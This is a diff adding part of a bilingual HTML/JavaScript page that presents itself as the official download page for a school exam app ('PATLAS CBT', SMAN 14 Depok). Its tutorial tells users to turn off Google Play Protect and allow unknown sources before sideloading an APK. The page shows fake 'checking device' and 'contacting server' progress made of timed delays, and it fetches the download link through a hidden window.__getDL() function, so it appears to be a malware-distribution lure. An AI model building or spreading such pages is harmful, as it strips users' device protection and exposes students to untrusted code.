+    tut1Note:"Cari ikon Play Store di layar utama atau laci aplikasi, lalu tap untuk membukanya.",
+    tut2Title:"Tap foto profil kamu",
+    tut2Note:"Di pojok kanan atas Play Store, tap ikon foto profil atau inisial akun Google kamu.",
+    tut3Title:'Cari dan tap "Play Protect"',
+    tut3Note:"Di menu yang muncul, scroll dan cari opsi <strong>Play Protect</strong>, lalu tap.",
+    tut4Title:"Tap ikon ⚙️ Settings di kanan atas",
+    tut4Note:"Di halaman Play Protect, tap ikon <strong>roda gigi (⚙️)</strong> atau <strong>Settings</strong> yang ada di pojok kanan atas layar.",
+    tut5Title:"Nonaktifkan kedua toggle switch",
+    tut5Note:"Pastikan <strong>kedua toggle switch</strong> di halaman ini benar-benar dalam posisi <strong>OFF (abu-abu)</strong>. Tap masing-masing toggle hingga tidak aktif.",
+    tut6Title:'Pilih "Jeda" dan konfirmasi',
+    tut6Note:'Saat muncul dialog konfirmasi, pilih opsi <strong>"Jeda"</strong>. Masukkan <strong>PIN atau sidik jari</strong> jika diminta oleh perangkat.',
+    lastStepLabel:"Langkah Terakhir",
+    tut7Title:"Selesai! Siap menginstal APK",
+    tut7Note:'Play Protect sudah berhasil dinonaktifkan sementara. Sekarang kamu bisa kembali ke atas dan tap tombol <strong>Download & Install APK</strong>. Aktifkan kembali Play Protect setelah instalasi selesai.',
+    completeBanner:"Play Protect dinonaktifkan — lanjutkan install APK sekarang!",
+    imgFallback:"Gambar tidak tersedia",
+    noticeAndroid:"ℹ️ Kamu sedang membuka halaman ini dari perangkat non-Android. Pindah ke HP Android untuk mengunduh dan menginstal aplikasi CBT.",
+    noticeErrorAndroid:"⚠️ Perangkat kamu bukan Android. Aplikasi PATLAS CBT hanya bisa diinstal di smartphone atau tablet Android. Buka halaman ini dari HP Android kamu.",
+    noticeSuccess:"✅ Download APK berhasil dimulai! Buka notifikasi untuk memantau progress. Setelah selesai, buka file APK dan tap 'Instal'.",
+    progressPrepare:"Menyiapkan download...",
+    progressCheck:"Mengecek perangkat...",
+    progressConnect:"Menghubungi server...",
+    progressStart:"Memulai download APK...",
+    progressDone:"Download dimulai!",
+    btnDownloading:"Mendownload...",
+    btnDone:"Download Dimulai!",
+    btnRetry:"Download Lagi",
+  },
+  en:{
+    topSchoolName:"SMAN 14 Depok",
+    heroSchoolName:"SMAN 14 Depok",
+    heroSchoolSub:"Depok, West Java — Official",
+    appSub:"Online Exam & Daily Quiz App<br>SMAN 14 Depok",
+    metaVersion:"Latest Version",
+    reqTitle:"Requirements",
+    req1:"Android device (version 6.0+)",
+    req2:'Enable "Install from Unknown Sources"',
+    req3:"Internet connection to log in",
+    btnInstallText:"Download & Install APK",
+    dlStep1:"Checking device...",
+    dlStep2:"Contacting server...",
+    dlStep3:"Starting APK download...",
+    footerNote:"By downloading, you agree to the",
+    footerLink:"Terms of Use",
+    tutPre:"Before Installing",
+    tutTitle:"Disable Play Protect",
+    tutSub:"Follow these steps to install successfully",
+    warningText:"Play Protect must be temporarily disabled so this official school APK can be installed. Re-enable it after the installation is complete.",
+    tut1Title:"Open Google Play Store",
+    tut1Note:"Find the Play Store icon on your home screen or app drawer, then tap to open it.",
+    tut2Title:"Tap your profile photo",
+    tut2Note:"In the top-right corner of the Play Store, tap your profile photo or Google account initials.",
+    tut3Title:'Find and tap "Play Protect"',
+    tut3Note:"In the menu that appears, scroll and find the <strong>Play Protect</strong> option, then tap it.",
+    tut4Title:"Tap the ⚙️ Settings icon (top right)",
+    tut4Note:"On the Play Protect page, tap the <strong>gear icon (⚙️)</strong> or <strong>Settings</strong> in the top-right corner of the screen.",
+    tut5Title:"Turn off both toggle switches",
+    tut5Note:"Make sure <strong>both toggle switches</strong> on this page are in the <strong>OFF (grey)</strong> position. Tap each toggle until it is disabled.",
+    tut6Title:'Select "Pause" and confirm',
+    tut6Note:'When a confirmation dialog appears, select <strong>"Pause"</strong>. Enter your <strong>PIN or fingerprint</strong> if prompted by your device.',
+    lastStepLabel:"Final Step",
+    tut7Title:"Done! Ready to install APK",
+    tut7Note:'Play Protect has been temporarily disabled. You can now go back up and tap <strong>Download & Install APK</strong>. Re-enable Play Protect after installation is complete.',
+    completeBanner:"Play Protect disabled — proceed to install APK now!",
+    imgFallback:"Image not available",
+    noticeAndroid:"ℹ️ You are viewing this page from a non-Android device. Switch to an Android phone to download and install the CBT app.",
+    noticeErrorAndroid:"⚠️ Your device is not Android. The PATLAS CBT app can only be installed on an Android smartphone or tablet. Open this page from an Android phone.",
+    noticeSuccess:"✅ APK download started! Open your notifications to monitor progress. Once done, open the APK file and tap 'Install'.",
+    progressPrepare:"Preparing download...",
+    progressCheck:"Checking device...",
+    progressConnect:"Contacting server...",
+    progressStart:"Starting APK download...",
+    progressDone:"Download started!",
+    btnDownloading:"Downloading...",
+    btnDone:"Download Started!",
+    btnRetry:"Download Again",
+  }
+};
+
+let lang='id';
+
+function setLang(l){
+  lang=l;
+  document.getElementById('btnID').classList.toggle('active',l==='id');
+  document.getElementById('btnEN').classList.toggle('active',l==='en');
+  const t=T[l];
+  document.querySelectorAll('[data-id]').forEach(el=>{
+    const key=el.getAttribute('data-id');
+    if(t[key]!==undefined){
+      if(key==='appSub'||key==='tut3Note'||key==='tut4Note'||key==='tut5Note'||key==='tut6Note'||key==='tut7Note'){
+        el.innerHTML=t[key];
+      } else {
+        el.textContent=t[key];
+      }
+    }
+  });
+}
+
+function toggleTheme(){
+  const html=document.documentElement;
+  const isDark=html.getAttribute("data-theme")==="dark";
+  html.setAttribute("data-theme",isDark?"light":"dark");
+  document.getElementById("themeIcon").textContent=isDark?"🌙":"☀️";
+}
+
+function isAndroid(){
+  return /android/i.test(navigator.userAgent||"");
+}
+
+function showNotice(type,text){
+  const el=document.getElementById("notice");
+  const icon=document.getElementById("noticeIcon");
+  el.className="notice show "+type;
+  document.getElementById("noticeText").textContent=text;
+  const icons={
+    error:'<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>',
+    info:'<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>',
+    success:'<path d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>'
+  };
+  icon.innerHTML=icons[type]||icons.info;
+}
+
+function hideNotice(){document.getElementById("notice").className="notice";}
+
+function setStep(n){
+  for(let i=1;i<=3;i++){
+    const el=document.getElementById("step"+i);
+    el.className="step"+(i<n?" done":i===n?" active":"");
+    const num=el.querySelector(".step-num");
+    if(i<n) num.innerHTML='<svg viewBox="0 0 24 24" fill="currentColor" width="10" height="10"><path d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
+    else num.textContent=i;
+  }
+}
+
+function setProgress(pct,label){
+  document.getElementById("progressFill").style.width=pct+"%";
+  document.getElementById("progressPct").textContent=pct+"%";
+  if(label) document.getElementById("progressLabel").textContent=label;
+}
+
+async function handleInstall(){
+  const btn=document.getElementById("btnInstall");
+  const stepsEl=document.getElementById("steps");
+  const progressWrap=document.getElementById("progressWrap");
+  const t=T[lang];
+  hideNotice();
+
+  btn.disabled=true;
+  btn.innerHTML='<div class="spinner"></div> '+t.progressCheck;
+  stepsEl.className="steps show";
+  setStep(1);
+  progressWrap.className="progress-wrap show";
+  setProgress(10,t.progressCheck);
+  await delay(700);
+
+  if(!isAndroid()){
+    btn.disabled=false;
+    btn.innerHTML='<svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 15v3H6v-3H4v3c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-3h-2zm-1-4-1.41-1.41L13 12.17V4h-2v8.17L8.41 9.59 7 11l5 5 5-5z"/></svg> '+t.btnInstallText;
+    stepsEl.className="steps";
+    progressWrap.className="progress-wrap";
+    showNotice("error",t.noticeErrorAndroid);
+    return;
+  }
+
+  setStep(2);
+  setProgress(40,t.progressConnect);
+  await delay(800);
+
+  setStep(3);
+  setProgress(70,t.progressStart);
+  btn.innerHTML='<div class="spinner"></div> '+t.btnDownloading;
+  await delay(600);
+
+  setProgress(100,t.progressDone);
+  await delay(300);
+
+  const a=document.createElement("a");
+  a.href=window.__getDL();
+  a.download="PATLAS-CBT-SMAN14.apk";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  await delay(400);
+  btn.disabled=false;
+  btn.innerHTML='<svg viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> '+t.btnDone;
+  showNotice("success",t.noticeSuccess);
+
+  setTimeout(()=>{
+    btn.innerHTML='<svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 15v3H6v-3H4v3c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-3h-2zm-1-4-1.41-1.41L13 12.17V4h-2v8.17L8.41 9.59 7 11l5 5 5-5z"/></svg> '+t.btnRetry;
+    stepsEl.className="steps";
+    progressWrap.className="progress-wrap";
+  },4000);
+}
+
+function delay(ms){return new Promise(r=>setTimeout(r,ms));}
+
+if(!isAndroid()){
+  showNotice("info",T[lang].noticeAndroid);
+}
+</script>
+</body>
+</html>
